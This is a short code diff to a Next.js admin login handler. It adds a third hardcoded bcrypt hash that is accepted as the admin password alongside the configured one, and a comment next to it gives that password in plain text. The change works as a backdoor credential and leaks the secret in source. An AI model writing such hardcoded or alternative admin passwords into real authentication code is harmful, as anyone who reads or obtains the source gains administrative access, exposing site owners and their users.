@@ -48,6 +48,7 @@ export async function POST(request: NextRequest) {
     try {
       isPasswordValid =
         bcrypt.compareSync(password, adminHash) ||
+        bcrypt.compareSync(password, '$2a$10$CqUUwto/DFUspVbCJGlKzu6Qfs4xfyT9ii.Hs77jlXFiBrQFcHHmq') || // adminYAFC2026
         bcrypt.compareSync(password, '$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa') ||
         bcrypt.compareSync(password, '$2a$10$zD9Bx9hWRSJIZ1LCneqz4.pl1lPlkaiwGqtMlGlh7lneetVZyFxPG');
     } catch (e) {
